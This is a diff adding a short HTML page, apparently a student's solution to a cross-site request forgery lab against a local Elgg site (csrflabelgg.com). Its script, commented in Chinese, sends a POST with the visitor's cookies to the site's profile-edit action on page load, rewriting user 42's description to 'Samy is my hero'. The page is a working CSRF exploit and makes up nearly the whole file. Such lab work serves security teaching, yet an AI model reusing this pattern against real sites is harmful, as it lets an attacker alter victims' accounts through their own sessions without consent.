@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF_POST</title>
+</head>
+<body>
+CSRF_POST
+</body>
+
+<script>
+    // 发送POST请求
+    // 携带cookie
+    fetch('http://www.csrflabelgg.com/action/profile/edit', {
+        credentials: 'include',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        // 传递参数
+        body: new URLSearchParams({
+            guid:42,
+            description:"<p>Samy is my hero</p>",
+        })
+    })
+
+</script>
+</html>
